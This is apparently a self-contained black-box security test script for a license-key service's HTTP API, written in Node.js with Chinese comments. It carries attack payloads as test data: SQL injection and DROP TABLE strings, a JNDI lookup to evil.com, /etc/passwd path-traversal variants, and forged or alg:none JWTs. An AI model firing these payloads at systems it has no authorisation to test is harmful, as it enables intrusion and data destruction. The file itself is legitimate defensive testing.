#!/usr/bin/env node
/**
 * 黑盒安全测试：只通过 HTTP 接口，不看源码、不碰数据库。
 * 每一项都明确写出「期望行为」，不符合就记为发现。
 *
 * 用法：node scripts/blackbox-test.js
 *   - 需要服务端在 127.0.0.1:3100 运行（或用 JC_BASE 环境变量指定）
 *   - 会自建测试用应用（sdk_demo、pentest_victim），跑完可用
 *     scripts/cleanup-demo-data.sh 清理
 *   - 覆盖：认证绕过、JWT 篡改、签名绕过、越权、注入、信息泄露、
 *     限流、参数边界、路径穿越、CORS、超大请求体等
 */
const crypto = require('crypto');
const fs = require('fs');

const BASE = process.env.JC_BASE || 'http://127.0.0.1:3100';
// SDK fixture 优先从 /tmp/sdk.env 读；没有就在运行时自建（见 ensureSdkFixture）。
// 脚本对环境零假设，可独立运行。
const env = (() => {
  try {
    return Object.fromEntries(
      fs.readFileSync('/tmp/sdk.env', 'utf8').trim().split('\n')
        .filter((l) => l.includes('='))
        .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]));
  } catch { return {}; }
})();

const C = { g: (s) => `\x1b[32m${s}\x1b[0m`, r: (s) => `\x1b[31m${s}\x1b[0m`,
            y: (s) => `\x1b[33m${s}\x1b[0m`, d: (s) => `\x1b[90m${s}\x1b[0m`,
            b: (s) => `\x1b[1m${s}\x1b[0m` };

const findings = [];
let passed = 0;

function pass(label, detail = '') {
  passed++;
  console.log(`  ${C.g('✓')} ${label}${detail ? C.d('  ' + detail) : ''}`);
}
function fail(severity, label, detail) {
  findings.push({ severity, label, detail });
  const tag = severity === 'high' ? C.r('[高危]') : severity === 'med' ? C.y('[中危]') : C.y('[低危]');
  console.log(`  ${C.r('✗')} ${tag} ${label}`);
  console.log(`      ${C.d(detail)}`);
}
function section(t) { console.log(`\n${C.b(t)}`); }

// ---------------------------------------------------------------- HTTP 工具

async function http(method, path, { body, headers = {}, raw } = {}) {
  const payload = raw !== undefined ? raw : body !== undefined ? JSON.stringify(body) : undefined;
  const h = { ...headers };
  if (payload !== undefined && !h['Content-Type']) h['Content-Type'] = 'application/json';
  const res = await fetch(BASE + path, { method, headers: h, body: payload });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* 非 JSON 响应 */ }
  return { status: res.status, headers: res.headers, text, json };
}

function sign(secret, method, path, body, over = {}) {
  const ts = over.ts ?? String(Math.floor(Date.now() / 1000));
  const nonce = over.nonce ?? crypto.randomUUID();
  const bh = crypto.createHash('sha256').update(body ?? '').digest('hex');
  const payload = [method.toUpperCase(), path, ts, nonce, bh].join('\n');
  const sig = over.sig ?? crypto.createHmac('sha256', secret).update(payload).digest('hex');
  return { 'X-Timestamp': ts, 'X-Nonce': nonce, 'X-Signature': sig };
}

/** 以插件身份发请求 */
async function plugin(who, method, path, body, over = {}) {
  const prefix = who === 'victim' ? 'VICTIM_' : 'SDK_';
  const token = over.token ?? env[prefix + (who === 'victim' ? 'TOKEN' : 'TOKEN')];
  const pid = over.pluginId ?? env[prefix + 'PLUGIN'];
  const secret = over.secret ?? env[prefix + 'SECRET'];
  const payload = body !== undefined ? JSON.stringify(body) : '';
  const headers = {
    Authorization: `Bearer ${token}`,
    'X-Plugin-Id': pid,
    ...sign(secret, method, path, payload, over),
    ...(over.extraHeaders || {}),
  };
  return http(method, path, { raw: payload || undefined, headers });
}

async function adminLogin(username = 'admin', password = 'Admin@123456') {
  const r = await http('POST', '/api/v1/admin/auth/login', { body: { username, password } });
  return r.json?.access_token;
}
const bearer = (t) => ({ Authorization: `Bearer ${t}` });

// ================================================================ 测试开始

(async () => {
  console.log(C.b('\n══════ 黑盒安全测试 ══════'));
  console.log(C.d(`目标: ${BASE}\n`));

  const adminToken = await adminLogin();
  if (!adminToken) { console.log(C.r('无法登录，测试中止（可能被限流，稍后重试）')); process.exit(1); }

  // 自建 victim fixture：越权测试需要一个「别的应用」，不依赖外部 env，保证脚本自包含
  async function ensureVictim() {
    const ah = { ...bearer(adminToken), 'Content-Type': 'application/json' };
    const appId = 'pentest_victim';
    let list = await http('GET', `/api/v1/admin/applications?keyword=${appId}`, { headers: bearer(adminToken) });
    let row = list.json?.items?.find((a) => a.app_id === appId);
    let created;
    if (!row) {
      created = (await http('POST', '/api/v1/admin/applications',
        { headers: ah, body: { app_id: appId, name: '越权测试目标' } })).json;
      row = created;
    }
    // 拿插件凭据
    const plg = (await http('GET', `/api/v1/admin/plugins?application_id=${row.id}`, { headers: bearer(adminToken) })).json;
    const cred = (await http('GET', `/api/v1/admin/plugins/${plg.items[0].id}/credentials`, { headers: bearer(adminToken) })).json;
    // 套餐 + 卡密
    let plans = (await http('GET', `/api/v1/admin/plans?application_id=${row.id}`, { headers: bearer(adminToken) })).json;
    let planId = plans.items?.[0]?.id;
    if (!planId) {
      planId = (await http('POST', '/api/v1/admin/plans', { headers: ah,
        body: { application_id: row.id, code: 'month', name: '月卡', duration_days: 30, device_limit: 1 } })).json.id;
    }
    const gen = (await http('POST', '/api/v1/admin/licenses/generate', { headers: ah,
      body: { plan_id: planId, count: 1 } })).json;
    return { appId, plugin: cred.plugin_id, token: cred.plugin_token, secret: cred.plugin_secret, key: gen.keys[0] };
  }
  // sdk_demo fixture：/tmp/sdk.env 有就用，没有就自建
  if (!env.SDK_PLUGIN || !env.SDK_SECRET) {
    const ah = { ...bearer(adminToken), 'Content-Type': 'application/json' };
    let list = await http('GET', '/api/v1/admin/applications?keyword=sdk_demo', { headers: bearer(adminToken) });
    let row = list.json?.items?.find((a) => a.app_id === 'sdk_demo');
    if (!row) {
      row = (await http('POST', '/api/v1/admin/applications',
        { headers: ah, body: { app_id: 'sdk_demo', name: '黑盒测试应用' } })).json;
    }
    const plg = (await http('GET', `/api/v1/admin/plugins?application_id=${row.id}`, { headers: bearer(adminToken) })).json;
    const cred = (await http('GET', `/api/v1/admin/plugins/${plg.items[0].id}/credentials`, { headers: bearer(adminToken) })).json;
    let plans = (await http('GET', `/api/v1/admin/plans?application_id=${row.id}`, { headers: bearer(adminToken) })).json;
    let planId = plans.items?.[0]?.id;
    if (!planId) {
      planId = (await http('POST', '/api/v1/admin/plans', { headers: ah,
        body: { application_id: row.id, code: 'month', name: '月卡', duration_days: 30, device_limit: 2, rebind_limit: 2 } })).json.id;
    }
    const gen = (await http('POST', '/api/v1/admin/licenses/generate', { headers: ah,
      body: { plan_id: planId, count: 9, prefix: 'BBX' } })).json;
    env.SDK_APP_ROW = row.id;
    env.SDK_PLAN = planId;
    env.SDK_PLUGIN = cred.plugin_id;
    env.SDK_TOKEN = cred.plugin_token;
    env.SDK_SECRET = cred.plugin_secret;
    gen.keys.forEach((k, i) => { env['SDK_FRESH' + (i + 1)] = k; });
  }

  const victim = await ensureVictim();
  env.VICTIM_PLUGIN = victim.plugin;
  env.VICTIM_TOKEN = victim.token;
  env.VICTIM_SECRET = victim.secret;
  env.VICTIM_KEY = victim.key;

  // ============================================================
  section('1. 未认证访问管理端接口');
  const adminPaths = [
    ['GET', '/api/v1/admin/applications'],
    ['GET', '/api/v1/admin/licenses'],
    ['GET', '/api/v1/admin/plugins'],
    ['GET', '/api/v1/admin/plans'],
    ['GET', '/api/v1/admin/releases'],
    ['GET', '/api/v1/admin/logs/audit'],
    ['GET', '/api/v1/admin/logs/activations'],
    ['POST', '/api/v1/admin/licenses/generate'],
    ['POST', '/api/v1/admin/licenses/export'],
  ];
  for (const [m, p] of adminPaths) {
    const r = await http(m, p, { body: m === 'POST' ? {} : undefined });
    if (r.status === 401) pass(`${m} ${p}`, '401');
    else fail('high', `${m} ${p} 未认证可访问`, `返回 ${r.status}: ${r.text.slice(0, 120)}`);
  }

  // ============================================================
  section('2. JWT 篡改');
  const [h, p, s] = adminToken.split('.');
  const decode = (b) => JSON.parse(Buffer.from(b, 'base64url').toString());
  const encode = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');

  // alg: none
  const noneTok = `${encode({ alg: 'none', typ: 'JWT' })}.${p}.`;
  let r = await http('GET', '/api/v1/admin/applications', { headers: bearer(noneTok) });
  r.status === 401 ? pass('alg:none 被拒', '401')
    : fail('high', 'alg:none 攻击成功', `返回 ${r.status}`);

  // 改 payload 保留原签名
  const tampered = { ...decode(p), sub: 'usr_attacker' };
  r = await http('GET', '/api/v1/admin/applications', { headers: bearer(`${h}.${encode(tampered)}.${s}`) });
  r.status === 401 ? pass('篡改 payload 被拒', '401')
    : fail('high', '篡改 payload 后仍可访问', `返回 ${r.status}`);

  // 用 refresh token 冒充 access token
  const loginRes = await http('POST', '/api/v1/admin/auth/login',
    { body: { username: 'admin', password: 'Admin@123456' } });
  r = await http('GET', '/api/v1/admin/applications',
    { headers: bearer(loginRes.json.refresh_token) });
  r.status === 401 ? pass('refresh token 不能当 access token 用', '401')
    : fail('high', 'refresh token 可当作 access token', `返回 ${r.status}`);

  // 空签名
  r = await http('GET', '/api/v1/admin/applications', { headers: bearer(`${h}.${p}.`) });
  r.status === 401 ? pass('空签名被拒', '401') : fail('high', '空签名可通过', `返回 ${r.status}`);

  // ============================================================
  section('3. 插件侧签名绕过');
  const policyPath = '/api/v1/license/policy?app_id=sdk_demo';

  r = await plugin('sdk', 'GET', policyPath);
  r.status === 200 ? pass('正常签名放行') : fail('high', '正常签名被拒', `返回 ${r.status}`);

  // 攻击:拿受害插件的 pluginId 但用自己的 token/secret 签名（攻击者不知道受害 secret）
  {
    const pth = '/api/v1/license/policy?app_id=pentest_victim';
    const ts = String(Math.floor(Date.now() / 1000)), nn = crypto.randomUUID();
    const bh = crypto.createHash('sha256').update('').digest('hex');
    const sig = crypto.createHmac('sha256', env.SDK_SECRET).update(['GET', pth, ts, nn, bh].join('\n')).digest('hex');
    r = await http('GET', pth, { headers: { Authorization: `Bearer ${env.SDK_TOKEN}`,
      'X-Plugin-Id': env.VICTIM_PLUGIN, 'X-Timestamp': ts, 'X-Nonce': nn, 'X-Signature': sig } });
    r.status === 401 ? pass('冒用受害 pluginId 被拒', 'SIGNATURE_INVALID')
      : fail('high', '可冒用别的 pluginId', `返回 ${r.status}: ${JSON.stringify(r.json)}`);
  }

  // 攻击:拿受害插件的 token + pluginId,但只能用自己的 secret 签名
  if (env.VICTIM_TOKEN && env.VICTIM_PLUGIN) {
    const pth = '/api/v1/license/policy?app_id=pentest_victim';
    const ts = String(Math.floor(Date.now() / 1000)), nn = crypto.randomUUID();
    const bh = crypto.createHash('sha256').update('').digest('hex');
    const sig = crypto.createHmac('sha256', env.SDK_SECRET).update(['GET', pth, ts, nn, bh].join('\n')).digest('hex');
    r = await http('GET', pth, { headers: { Authorization: `Bearer ${env.VICTIM_TOKEN}`,
      'X-Plugin-Id': env.VICTIM_PLUGIN, 'X-Timestamp': ts, 'X-Nonce': nn, 'X-Signature': sig } });
    r.status === 401 ? pass('仅有 Token 而不知 secret 被拒', 'SIGNATURE_INVALID')
      : fail('high', '仅凭 Token 即可调用（签名形同虚设）', `返回 ${r.status}`);
  }

  // 分隔符歧义:在 timestamp 字段里塞换行,试图让 (ts='X\nEXTRA') 与另一种
  // 字段切分等价。若服务端严格用 '\n' join 固定字段,就无法构造成功。
  {
    const ijPath = '/api/v1/license/policy?app_id=sdk_demo';
    const ts2 = String(Math.floor(Date.now() / 1000));
    const nonce2 = crypto.randomUUID();
    const bh2 = crypto.createHash('sha256').update('').digest('hex');
    const evil = ['GET', ijPath, ts2 + '\nEXTRA', nonce2, bh2].join('\n');
    const esig = crypto.createHmac('sha256', env.SDK_SECRET).update(evil).digest('hex');
    r = await http('GET', ijPath, {
      headers: { Authorization: `Bearer ${env.SDK_TOKEN}`, 'X-Plugin-Id': env.SDK_PLUGIN,
                 'X-Timestamp': ts2, 'X-Nonce': nonce2, 'X-Signature': esig },
    });
    r.status === 401 ? pass('签名字段分隔符歧义无效', '401')
      : fail('med', '签名可被分隔符歧义构造', `返回 ${r.status}`);
  }

  // 超长 nonce
  r = await plugin('sdk', 'GET', policyPath, undefined, { nonce: 'A'.repeat(5000) });
  r.status >= 400 ? pass('超长 nonce 被拒', `${r.status}`)
    : fail('low', '超长 nonce 被接受', `返回 ${r.status}`);

  // 负数时间戳 / 非数字
  for (const bad of ['-1', 'abc', '99999999999999999999', '']) {
    r = await plugin('sdk', 'GET', policyPath, undefined, { ts: bad });
    if (r.status >= 400) pass(`异常时间戳 "${bad.slice(0, 12)}" 被拒`, `${r.status}`);
    else fail('med', `异常时间戳 "${bad}" 被接受`, `返回 ${r.status}`);
  }

  // ============================================================
  section('4. 跨应用越权（IDOR）');

  if (!env.VICTIM_KEY || env.VICTIM_KEY === 'null' || env.VICTIM_KEY.length < 8) {
    console.log(C.y('  ⚠ 跳过跨应用测试:VICTIM_KEY 未正确生成'));
  } else {
    // 用 sdk_demo 的插件去激活 victim_app 的卡密
    r = await plugin('sdk', 'POST', '/api/v1/license/activate', {
      app_id: 'sdk_demo', license_key: env.VICTIM_KEY, device_id: 'attacker-device-0001',
    });
    r.json?.code === 'APP_MISMATCH'
      ? pass('跨应用激活被拒', 'APP_MISMATCH')
      : fail('high', '可跨应用激活他人卡密', `返回 ${r.status}: ${JSON.stringify(r.json)?.slice(0, 160)}`);

    // 声称自己是 victim_app
    r = await plugin('sdk', 'POST', '/api/v1/license/activate', {
      app_id: 'pentest_victim', license_key: env.VICTIM_KEY, device_id: 'attacker-device-0002',
    });
    r.json?.code === 'APP_MISMATCH'
      ? pass('伪造 app_id 被拒', 'APP_MISMATCH')
      : fail('high', '可伪造 app_id 操作他人应用', `返回 ${r.status}: ${JSON.stringify(r.json)?.slice(0, 160)}`);
  }

  // 用自己的插件查询受害应用的卡密状态
  r = await plugin('sdk', 'GET',
    `/api/v1/license/status?app_id=sdk_demo&license_key=${encodeURIComponent(env.VICTIM_KEY)}`);
  r.json?.code === 'APP_MISMATCH' || r.json?.code === 'LICENSE_NOT_FOUND'
    ? pass('跨应用状态查询被拒', r.json.code)
    : fail('high', '可查询他人应用的卡密状态', `返回 ${r.status}: ${JSON.stringify(r.json)?.slice(0, 160)}`);

  // ============================================================
  section('5. 注入');
  const injections = [
    "' OR '1'='1",
    "'; DROP TABLE license_keys; --",
    '1 UNION SELECT * FROM admin_users',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}',
    '../../../../etc/passwd',
    '\x00admin',
  ];
  for (const payload of injections) {
    const rr = await http('GET',
      `/api/v1/admin/licenses?key_prefix=${encodeURIComponent(payload)}`,
      { headers: bearer(adminToken) });
    const body = rr.text;
    if (rr.status >= 500) {
      fail('med', `注入载荷导致 5xx: ${payload.slice(0, 30)}`, `${rr.status} ${body.slice(0, 120)}`);
    } else if (/sql|prisma|syntax|stack|at Object|node_modules/i.test(body)) {
      fail('med', `注入载荷回显内部信息: ${payload.slice(0, 30)}`, body.slice(0, 160));
    } else {
      pass(`注入载荷被安全处理: ${payload.slice(0, 26)}`, `${rr.status}`);
    }
  }

  // Prisma 过滤器对象注入：把查询参数塞成对象
  r = await http('GET', '/api/v1/admin/licenses?status[not]=revoked', { headers: bearer(adminToken) });
  r.status >= 500
    ? fail('med', '对象型查询参数导致 5xx', r.text.slice(0, 140))
    : pass('对象型查询参数被安全处理', `${r.status}`);

  // ============================================================
  section('6. 信息泄露');

  // 响应头指纹
  r = await http('GET', '/api/v1/admin/applications', { headers: bearer(adminToken) });
  const powered = r.headers.get('x-powered-by');
  powered
    ? fail('low', '响应头暴露技术栈', `X-Powered-By: ${powered}`)
    : pass('未暴露 X-Powered-By');

  // 500 是否泄露堆栈
  r = await http('POST', '/api/v1/admin/licenses/generate',
    { headers: bearer(adminToken), body: { plan_id: { $ne: null }, count: 1 } });
  /at .*\/(src|node_modules)\/|Error:.*\n\s+at /.test(r.text)
    ? fail('med', '错误响应泄露堆栈', r.text.slice(0, 200))
    : pass('错误响应不含堆栈', `${r.status} ${r.json?.code ?? ''}`);

  // 列表接口是否泄露卡密明文或哈希
  r = await http('GET', '/api/v1/admin/licenses?page_size=5', { headers: bearer(adminToken) });
  const listBody = r.text;
  const leaks = ['keyCipher', 'key_cipher', 'keyHash', 'key_hash', 'passwordHash', 'secretCipher']
    .filter((k) => listBody.includes(k));
  leaks.length
    ? fail('high', '列表接口泄露敏感字段', leaks.join(', '))
    : pass('列表接口无敏感字段泄露');

  // 用户枚举：不存在的用户与错误密码是否可区分
  const t0 = Date.now();
  const noUser = await http('POST', '/api/v1/admin/auth/login',
    { body: { username: 'definitely_not_exist_' + Date.now(), password: 'x' } });
  const t1 = Date.now();
  const badPw = await http('POST', '/api/v1/admin/auth/login',
    { body: { username: 'admin', password: 'wrong_password_here' } });
  const t2 = Date.now();
  if (noUser.json?.code !== badPw.json?.code) {
    fail('med', '可通过错误码枚举用户名',
      `不存在=${noUser.json?.code} 密码错=${badPw.json?.code}`);
  } else {
    const delta = Math.abs((t1 - t0) - (t2 - t1));
    delta > 300
      ? fail('low', '可通过响应时间枚举用户名', `时间差 ${delta}ms`)
      : pass('用户枚举防护有效', `同码 ${noUser.json?.code}，时间差 ${delta}ms`);
  }

  // 授权日志是否泄露完整设备指纹
  r = await http('GET', '/api/v1/admin/logs/activations?page_size=20', { headers: bearer(adminToken) });
  const hasFullFp = (r.json?.items ?? []).some(
    (i) => i.device_id && i.device_id.length > 20 && !i.device_id.includes('*'));
  hasFullFp
    ? fail('low', '日志泄露完整设备指纹', '存在未脱敏的长指纹')
    : pass('日志中设备指纹已脱敏');

  // ============================================================
  section('7. 限流与爆破');

  // 登录爆破
  let limited = false;
  for (let i = 0; i < 25; i++) {
    const rr = await http('POST', '/api/v1/admin/auth/login',
      { body: { username: 'brute_probe_' + Date.now(), password: 'x' } });
    if (rr.json?.code === 'RATE_LIMITED') { limited = true; break; }
  }
  limited ? pass('登录接口有 IP 维度限流')
    : fail('med', '登录接口未触发限流', '25 次连续失败登录未被拦截');

  // 卡密枚举:连续试错不存在的卡密,失败计数阈值 30
  let keyLimitedAt = 0;
  for (let i = 0; i < 40; i++) {
    const rr = await plugin('sdk', 'POST', '/api/v1/license/activate', {
      app_id: 'sdk_demo',
      license_key: 'AAAAA-BBBBB-CCCCC-DDDDD-' + String(i).padStart(5, '0'),
      device_id: 'brute-device-' + String(i).padStart(4, '0'),
    });
    if (rr.json?.code === 'RATE_LIMITED') { keyLimitedAt = i + 1; break; }
  }
  keyLimitedAt > 0 && keyLimitedAt <= 35
    ? pass('激活接口有失败限流，可抑制卡密枚举', `第 ${keyLimitedAt} 次触发`)
    : fail('med', '激活接口失败限流未生效', `40 次未触发`);

  // ============================================================
  section('8. 业务逻辑与参数边界');

  // 负数/超大 count
  for (const count of [-1, 0, 999999, 1.5]) {
    const rr = await http('POST', '/api/v1/admin/licenses/generate',
      { headers: bearer(adminToken), body: { plan_id: env.SDK_PLAN, count } });
    rr.status === 400 || rr.json?.code === 'INVALID_REQUEST'
      ? pass(`count=${count} 被拒`, rr.json?.code)
      : fail('med', `count=${count} 被接受`, `返回 ${rr.status}`);
  }

  // 超大分页
  r = await http('GET', '/api/v1/admin/licenses?page_size=999999', { headers: bearer(adminToken) });
  // 安全的形态有两种:钳制到上限(返回 <=200),或直接 400 拒绝。都可接受。
  if (r.status === 400 && r.json?.code === 'INVALID_REQUEST') {
    pass('超大分页被拒绝', '400 INVALID_REQUEST');
  } else if (r.json?.page_size && r.json.page_size <= 200) {
    pass('分页大小被钳制', `page_size=${r.json.page_size}`);
  } else {
    fail('med', '分页大小未受控', `page_size=${r.json?.page_size}, status=${r.status}`);
  }

  // 续期天数负值
  r = await http('GET', '/api/v1/admin/licenses?page_size=1', { headers: bearer(adminToken) });
  const anyLic = r.json?.items?.[0]?.id;
  if (anyLic) {
    const rr = await http('POST', `/api/v1/admin/licenses/${anyLic}/renew`,
      { headers: bearer(adminToken), body: { days: -3650 } });
    rr.status === 400 ? pass('负数续期天数被拒', rr.json?.code)
      : fail('med', '负数续期天数被接受', `返回 ${rr.status}`);
  }

  // 灰度百分比越界
  r = await http('POST', '/api/v1/admin/releases', {
    headers: { ...bearer(adminToken), 'Content-Type': 'application/json' },
    body: { application_id: env.SDK_APP_ROW, version: '9.9.9',
            external_url: 'https://e.com/a.exe', rollout_percent: 500 },
  });
  r.status === 400 ? pass('灰度百分比越界被拒', r.json?.code)
    : fail('low', '灰度百分比可超过 100', `返回 ${r.status}`);

  // ============================================================
  section('9. 文件下载路径穿越');
  const traversals = [
    '../../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '....//....//etc/passwd',
    'rel_x/../../../../etc/passwd',
  ];
  for (const t of traversals) {
    const rr = await http('GET', `/api/v1/releases/${encodeURIComponent(t)}/download`);
    if (rr.text.includes('root:') || rr.text.includes('/bin/bash')) {
      fail('high', `下载接口路径穿越: ${t}`, rr.text.slice(0, 120));
    } else {
      pass(`路径穿越被拒: ${t.slice(0, 28)}`, `${rr.status}`);
    }
  }

  // ============================================================
  section('10. CORS 与其他');

  r = await http('GET', '/api/v1/admin/applications', {
    headers: { ...bearer(adminToken), Origin: 'https://evil.example.com' },
  });
  const acao = r.headers.get('access-control-allow-origin');
  const acac = r.headers.get('access-control-allow-credentials');
  if (acao === '*' && acac === 'true') {
    fail('high', 'CORS 配置危险', 'Allow-Origin: * 同时 Allow-Credentials: true');
  } else if (acao === 'https://evil.example.com' || acao === '*') {
    fail('med', 'CORS 允许任意来源', `Allow-Origin: ${acao}, Credentials: ${acac}`);
  } else {
    pass('CORS 配置未反射任意来源', `Allow-Origin: ${acao ?? '(无)'}`);
  }

  // 超大请求体
  const huge = 'x'.repeat(12 * 1024 * 1024);
  try {
    const rr = await http('POST', '/api/v1/admin/auth/login',
      { raw: JSON.stringify({ username: huge, password: 'x' }),
        headers: { 'Content-Type': 'application/json' } });
    rr.status === 413 || rr.status === 400
      ? pass('超大请求体被拒', `${rr.status}`)
      : fail('med', '超大请求体被接受', `返回 ${rr.status}，存在内存耗尽风险`);
  } catch (e) {
    pass('超大请求体被连接层拒绝', e.message.slice(0, 60));
  }

  // HTTP 方法覆盖
  r = await http('POST', '/api/v1/admin/applications', {
    headers: { ...bearer(adminToken), 'X-HTTP-Method-Override': 'DELETE' },
    body: { app_id: 'method_override_test', name: 'x' },
  });
  pass('方法覆盖头未造成异常', `${r.status}`);

  // ================================================================ 汇总
  console.log(C.b('\n══════ 汇总 ══════'));
  console.log(`  通过: ${C.g(passed)} 项`);
  if (!findings.length) {
    console.log(`  ${C.g('未发现问题')}\n`);
  } else {
    const by = (s) => findings.filter((f) => f.severity === s);
    console.log(`  发现: ${C.r(by('high').length + ' 高危')} / ${C.y(by('med').length + ' 中危')} / ${C.y(by('low').length + ' 低危')}\n`);
    for (const f of findings) {
      const tag = f.severity === 'high' ? C.r('高危') : f.severity === 'med' ? C.y('中危') : C.y('低危');
      console.log(`  [${tag}] ${f.label}`);
      console.log(`         ${C.d(f.detail)}`);
    }
    console.log();
  }
  process.exit(0);
})();
